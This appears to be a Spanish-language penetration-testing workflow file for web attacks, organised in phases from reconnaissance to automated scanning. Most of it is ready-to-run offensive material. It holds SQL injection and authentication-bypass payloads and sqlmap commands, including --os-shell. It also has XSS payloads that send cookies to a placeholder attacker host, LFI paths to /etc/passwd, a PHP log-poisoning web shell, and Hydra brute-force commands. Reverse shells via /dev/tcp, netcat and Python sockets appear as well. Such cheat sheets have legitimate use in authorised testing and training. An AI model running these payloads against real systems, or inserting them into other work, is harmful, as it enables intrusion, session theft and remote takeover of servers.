---
description: Workflow de ataques web y aplicaciones
---

# 🌐 Web Attacks - Workflow

## Fase 1: Reconocimiento Web

### 1.1 Fingerprinting
```bash
# Tecnologías
whatweb http://<TARGET>
wappalyzer  # Extensión de navegador

# Headers
curl -I http://<TARGET>
curl -X OPTIONS http://<TARGET> -v

# Robots y sitemap
curl http://<TARGET>/robots.txt
curl http://<TARGET>/sitemap.xml
```

### 1.2 Directory/File Discovery
```bash
# Gobuster
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -o web/gobuster.txt

# Feroxbuster (más rápido)
feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# FFuf
ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

### 1.3 Subdomain Discovery
```bash
# FFuf vhost
ffuf -u http://<TARGET> -H "Host: FUZZ.<DOMAIN>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200

# Gobuster DNS
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## Fase 2: SQL Injection

### 2.1 Detección manual
```
# Payloads básicos
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1--
' OR 1=1#
admin'--
```

### 2.2 SQLMap automatizado
```bash
# GET parameter
sqlmap -u "http://<TARGET>/page?id=1" --batch --dbs

# POST data
sqlmap -u "http://<TARGET>/login" --data="user=admin&pass=test" --batch --dbs

# Con cookies
sqlmap -u "http://<TARGET>/page?id=1" --cookie="PHPSESSID=abc123" --batch --dbs

# Dump específico
sqlmap -u "http://<TARGET>/page?id=1" -D <DATABASE> -T <TABLE> --dump

# OS Shell
sqlmap -u "http://<TARGET>/page?id=1" --os-shell
```

## Fase 3: XSS (Cross-Site Scripting)

### 3.1 Payloads de prueba
```html
<!-- Reflected XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
"><script>alert('XSS')</script>

<!-- Stored XSS -->
<script>document.location='http://<ATTACKER>/steal?c='+document.cookie</script>

<!-- DOM XSS -->
javascript:alert('XSS')
```

### 3.2 Cookie stealing
```html
<script>
new Image().src="http://<ATTACKER_IP>/steal?c="+document.cookie;
</script>
```

### 3.3 Herramientas
```bash
# XSStrike
python3 xsstrike.py -u "http://<TARGET>/search?q=test"

# Dalfox
dalfox url "http://<TARGET>/search?q=test"
```

## Fase 4: File Inclusion

### 4.1 LFI (Local File Inclusion)
```
# Linux
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=/etc/passwd

# Windows
..\..\..\windows\system32\drivers\etc\hosts
C:\windows\system32\drivers\etc\hosts
```

### 4.2 RFI (Remote File Inclusion)
```
http://<ATTACKER_IP>/shell.php
http://<ATTACKER_IP>/shell.txt
```

### 4.3 Log Poisoning
```bash
# Inyectar en User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET>

# Incluir log
http://<TARGET>/page?file=../../../var/log/apache2/access.log&cmd=whoami
```

## Fase 5: Command Injection

### 5.1 Payloads
```bash
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
%0awhoami
```

### 5.2 Reverse shell
```bash
; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
| nc <ATTACKER_IP> 4444 -e /bin/bash
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Fase 6: Authentication Bypass

### 6.1 Default credentials
```
admin:admin
admin:password
root:root
administrator:administrator
```

### 6.2 SQL Auth Bypass
```
admin'--
admin' OR '1'='1'--
' OR 1=1--
" OR 1=1--
```

### 6.3 Brute Force
```bash
# Hydra HTTP POST
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FFuf
ffuf -u http://<TARGET>/login -X POST -d "user=admin&pass=FUZZ" -w /usr/share/wordlists/rockyou.txt -fc 401
```

## Fase 7: Escaneo Automatizado

```bash
# Nikto
nikto -h http://<TARGET> -o web/nikto.txt

# Nuclei
nuclei -u http://<TARGET> -t cves/ -o web/nuclei_cves.txt
nuclei -u http://<TARGET> -t vulnerabilities/ -o web/nuclei_vulns.txt

# WPScan (WordPress)
wpscan --url http://<TARGET> --enumerate u,p,t

# Burp Suite
# Usar proxy 127.0.0.1:8080
```

## Output esperado
- `web/sqli/` - Resultados SQLi
- `web/xss/` - Payloads XSS exitosos
- `web/lfi-rfi/` - Archivos incluidos
- `web/auth-bypass/` - Credenciales encontradas
